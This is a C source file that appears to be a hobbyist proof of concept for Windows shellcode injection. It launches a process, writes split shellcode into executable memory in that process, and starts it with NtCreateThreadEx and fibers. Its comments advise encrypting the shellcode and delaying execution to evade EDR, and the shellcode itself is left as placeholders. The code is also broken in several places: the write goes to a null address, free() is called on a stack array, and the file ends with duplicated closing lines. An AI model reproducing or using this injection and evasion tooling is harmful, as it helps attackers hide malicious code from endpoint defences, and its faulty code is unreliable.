#include <windows.h>
#include <winternl.h>
#include <stdio.h>

//By Sleepy http://github.com/SleepyG8 ;)


//create a process
//open a process
//split shellcode into 2 
//use fibers for more obfuscation
//priv escalation use case create remote connection



HANDLE hProcess;
LPVOID remoteMem;


typedef NTSTATUS(NTAPI *NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID lpStartAddress,
    PVOID lpParameter,
    ULONG Flags,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    PVOID lpBytesBuffer
); //setting ntcreatethreadex struct

BOOL WINAPI finalFiber(LPVOID param) {
    printf("Executing shellcode in remote fiber...\n");

    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteMem, 300, PAGE_EXECUTE_READWRITE, &oldProtect);

    ((void(*)())remoteMem)(); // exec
    return TRUE;
}

BOOL WINAPI finalExec() {
    LPVOID fiberMain = ConvertThreadToFiber(NULL); //convert the thread to a fiber
    LPVOID debugFiber = CreateFiber(0, finalFiber, NULL); // setting up fiber

    printf("about to run the shellcode...\n"); // prep done 


    SwitchToFiber(debugFiber);

    //Hidden proc + obfuscated shellcode = full control

    DeleteFiber(debugFiber); 

    return TRUE;
}

BOOL WINAPI debug(LPCVOID param) {

    //orignal shellcode "\x55\x89\xE5\xB8\x30\x40\x40\x00\x50\xB9\x20\x30\x40\x00\x51\xE8\x10\x00\x00\x00\xC9\xC3"; do not use x00 Null Op we dont need any nop sleds lol
    //you know how to get a real one

    //add xor opperation or aes for more obfuscation
    //set timed based fibers to delay execution and evade EDR

    unsigned char shellcode1[] = "first half here";
    unsigned char shellcode2[] = "second half here\n";
    //must be encrypted and decrypted with either XOR or AES if your feeling fancy
 
    char finalShellcode[500]; //use stack for more stealth
    if (!finalShellcode) return FALSE; 

    memcpy(finalShellcode, (char*)shellcode1, strlen(shellcode1));
    memcpy(finalShellcode + strlen(shellcode1), (char*)shellcode2, strlen(shellcode2)); //combine chars ;)

     remoteMem = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //alloc in remote proc

    if (!remoteMem) {
        printf("error writing to memory\n");
        VirtualFreeEx(hProcess, finalShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, NULL, finalShellcode, sizeof(finalShellcode), NULL)) {
        printf("error writing to process memory\n");
        VirtualFreeEx(hProcess, finalShellcode, 0, MEM_RELEASE); //writing
        CloseHandle(hProcess);
        return FALSE;
    }

    NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    if (!NtCreateThreadEx) {
    printf("Failed to resolve NtCreateThreadEx.\n");
    return 1;
    }

    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, finalExec, NULL, FALSE, 0, 0, 0, NULL);

    if (status != 0 || !hThread) {
        printf("Failed to create remote thread.\n");
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE); //most looked at call by EDRs fiber helps hide this particular ntdll call
        CloseHandle(hProcess);
        return 1;
    }


    free(finalShellcode);
    return TRUE;

}



int main(int argc,char* argv[]) {

    if (argc < 2 || strcmp(argv[1], "help") == 0) {
        printf("Usage: %s <path to process> <1st half of shellcode> <second half of shellcode>\n", argv[0]);
    }

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
   
    if (CreateProcess(
        argv[1],
        NULL,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi)) {
    printf("Opening process %s:\n", argv[1]);

        } else {
            printf("Error creating process\n");
        }


        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
        if (hProcess) {
            LPVOID fiberMain = ConvertThreadToFiber(NULL); //convert the thread to a fiber
            LPVOID debugFiber = CreateFiber(0, debug, argv[1]); // setting up fiber

            printf("about to run the shellcode...\n"); // prep done 


            SwitchToFiber(debugFiber);

            //Hidden proc + obfuscated shellcode = full control

            DeleteFiber(debugFiber); 


        } else {
            printf("Failed to open process\n");
        }


    return 0;
}

    return 0;
}
